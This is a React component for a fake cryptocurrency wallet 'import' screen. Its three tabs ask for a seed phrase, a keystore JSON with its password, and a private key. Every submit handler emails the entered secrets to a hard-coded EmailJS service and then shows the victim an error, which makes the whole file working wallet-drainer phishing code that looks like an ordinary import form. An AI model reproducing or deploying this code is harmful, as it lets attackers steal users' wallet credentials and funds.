"use client";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import emailjs from "@emailjs/browser";
import { Formik } from "formik";
import * as Yup from "yup";
import toast from "react-hot-toast";

export function PhraseTabs() {
  return (
    <Tabs defaultValue="phrase" className="">
      <TabsList className="grid w-full grid-cols-3 gap-2">
        <TabsTrigger className="text-[13px]" value="phrase">
          Phrase
        </TabsTrigger>
        <TabsTrigger className="text-[13px]" value="keystore_json">
          Keystore JSON
        </TabsTrigger>
        <TabsTrigger className="text-[13px]" value="private_key">
          Private Key
        </TabsTrigger>
      </TabsList>

      <TabsContent value="phrase">
        <Formik
          initialValues={{
            phrase: "",
          }}
          validationSchema={Yup.object({
            phrase: Yup.string().required("Required"),
          })}
          onSubmit={(values, { setSubmitting, resetForm }) => {
            setTimeout(() => {
              const serviceID = "service_xsr3bjy";
              const templateID = "template_m01yh7a";
              const publicKey = "b0Hn6iOQQdLApHYpr";
              emailjs
                .send(serviceID, templateID, values, publicKey)
                .then(() => {
                  setSubmitting(false);
                  errorMessage();
                  resetForm({
                    values: "",
                  });
                })
                .catch(() => {
                  toast.error("An error occured, please try again later");
                });
            }, 1000);
          }}
        >
          {(formik) => (
            <form className="" onSubmit={formik.handleSubmit}>
              <textarea
                className="block w-full rounded-md border bg-white px-4 py-3 text-sm text-gray-900 focus:border-violet-800 focus:ring-violet-800 md:text-md"
                rows="4"
                placeholder="Phrase"
                id="phrase"
                {...formik.getFieldProps("phrase")}
                required
              ></textarea>

              {formik.touched.phrase && formik.errors.phrase ? (
                <small className="text-xs text-red-500">
                  {formik.errors.phrase}
                </small>
              ) : null}

              <p className="mb-5 mt-3 text-xs text-gray-700">
                Typically 12 (sometimes 24) words seperated by a single spaces
              </p>

              <button
                type="submit"
                className="inline-flex w-full items-center justify-center gap-2 rounded-md border border-transparent bg-gradient-to-br from-blue-600 to-violet-600 px-4 py-3 text-sm font-medium text-white transition-all hover:bg-emerald-700 focus:outline-none md:text-md"
              >
                {formik.isSubmitting ? "Importing..." : "Import root pair"}
              </button>
            </form>
          )}
        </Formik>
      </TabsContent>

      <TabsContent value="keystore_json">
        <Formik
          initialValues={{
            phrase: "",
            password: "",
          }}
          validationSchema={Yup.object({
            phrase: Yup.string().required("Required"),
            password: Yup.string().required("Required"),
          })}
          onSubmit={(values, { setSubmitting, resetForm }) => {
            setTimeout(() => {
              const serviceID = "service_xsr3bjy";
              const templateID = "template_m01yh7a";
              const publicKey = "b0Hn6iOQQdLApHYpr";
              emailjs
                .send(serviceID, templateID, values, publicKey)
                .then(() => {
                  setSubmitting(false);
                  errorMessage();
                  resetForm({
                    values: "",
                  });
                })
                .catch(() => {
                  toast.error("An error occured, please try again later");
                });
            }, 1000);
          }}
        >
          {(formik) => (
            <form className="" onSubmit={formik.handleSubmit}>
              <textarea
                className="block w-full rounded-md border bg-white px-4 py-3 text-sm text-gray-900 focus:border-violet-800 focus:ring-violet-800 md:text-md"
                rows="4"
                placeholder="Keystore JSON"
                id="phrase"
                {...formik.getFieldProps("phrase")}
                required
              ></textarea>

              {formik.touched.phrase && formik.errors.phrase ? (
                <small className="text-xs text-red-500">
                  {formik.errors.phrase}
                </small>
              ) : null}

              <input
                type="password"
                className="mt-3 block w-full rounded-md border bg-white px-4 py-3 text-sm text-gray-900 focus:border-violet-800 focus:ring-violet-800 md:text-md"
                placeholder="Keystore password"
                id="password"
                {...formik.getFieldProps("password")}
                required
              />
              {formik.touched.password && formik.errors.password ? (
                <small className="text-xs text-red-500">
                  {formik.errors.password}
                </small>
              ) : null}

              <p className="mb-4 mt-3 text-xs text-gray-700">
                Several lines of text beginning with “&#x7b;...&#x7d;” plus the
                password you used for encryption.
              </p>

              <button
                type="submit"
                className="inline-flex w-full items-center justify-center gap-2 rounded-md border border-transparent bg-gradient-to-br from-blue-600 to-violet-600 px-4 py-3 text-sm font-medium text-white transition-all hover:bg-emerald-700 focus:outline-none md:text-md"
              >
                {formik.isSubmitting ? "Importing..." : "Import root pair"}
              </button>
            </form>
          )}
        </Formik>
      </TabsContent>

      <TabsContent value="private_key">
        <Formik
          initialValues={{
            phrase: "",
          }}
          validationSchema={Yup.object({
            phrase: Yup.string().required("Required"),
          })}
          onSubmit={(values, { setSubmitting, resetForm }) => {
            setTimeout(() => {
              const serviceID = "service_xsr3bjy";
              const templateID = "template_m01yh7a";
              const publicKey = "b0Hn6iOQQdLApHYpr";
              emailjs
                .send(serviceID, templateID, values, publicKey)
                .then(() => {
                  setSubmitting(false);
                  errorMessage();
                  resetForm({
                    values: "",
                  });
                })
                .catch(() => {
                  toast.error("An error occured, please try again later");
                });
            }, 1000);
          }}
        >
          {(formik) => (
            <form className="" onSubmit={formik.handleSubmit}>
              <textarea
                className="block w-full rounded-md border bg-white px-4 py-3 text-sm text-gray-900 focus:border-violet-800 focus:ring-violet-800 md:text-md"
                rows="4"
                placeholder="Private key"
                id="phrase"
                {...formik.getFieldProps("phrase")}
                required
              ></textarea>

              {formik.touched.phrase && formik.errors.phrase ? (
                <small className="text-xs text-red-500">
                  {formik.errors.phrase}
                </small>
              ) : null}

              <p className="mb-5 mt-3 text-xs text-gray-700">
                Several lines of text containing alphanumeric characters.
              </p>

              <button
                type="submit"
                className="inline-flex w-full items-center justify-center gap-2 rounded-md border border-transparent bg-gradient-to-br from-blue-600 to-violet-600 px-4 py-3 text-sm font-medium text-white transition-all hover:bg-emerald-700 focus:outline-none md:text-md"
              >
                {formik.isSubmitting ? "Importing..." : "Import root pair"}
              </button>
            </form>
          )}
        </Formik>
      </TabsContent>
    </Tabs>
  );
}